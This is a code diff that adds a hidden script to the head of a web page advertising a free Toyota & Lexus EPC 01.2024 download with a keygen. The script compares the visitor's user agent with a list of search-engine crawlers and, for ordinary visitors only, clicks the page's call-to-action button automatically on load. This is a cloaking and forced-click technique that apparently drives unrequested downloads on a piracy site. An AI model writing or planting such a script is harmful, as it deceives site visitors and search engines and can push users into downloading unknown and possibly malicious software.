@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Toyota &amp; Lexus EPC 01.2024 (All regions)</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Explore the comprehensive Toyota &amp; Lexus EPC 01.2024 for all regions. Access detailed parts catalogs, diagrams, and information for accurate maintenance and repair of Toyota and Lexus vehicles">
     <meta name="keywords" content="Toyota EPC 01.2024, Lexus EPC 01.2024, Toyota &amp; Lexus EPC, download free, keygen, Toyota EPC all regions, Lexus EPC all regions, 2024 EPC Toyota Lexus, Toyota Lexus catalog, Toyota Lexus software free download, Toyota EPC 01.2024, Lexus EPC 01.2024, Toyota &amp; Lexus EPC, скачать бесплатно, кейген, Toyota EPC все регионы, Lexus EPC все регионы, 2024 EPC Toyota Lexus, каталог Toyota Lexus, программное обеспечение Toyota Lexus скачать бесплатно, завантажити безкоштовно, кейген, Toyota EPC всі регіони, Lexus EPC всі регіони, 2024 EPC Toyota Lexus, каталог Toyota Lexus, програмне забезпечення Toyota Lexus завантажити безкоштовно">
     <style>
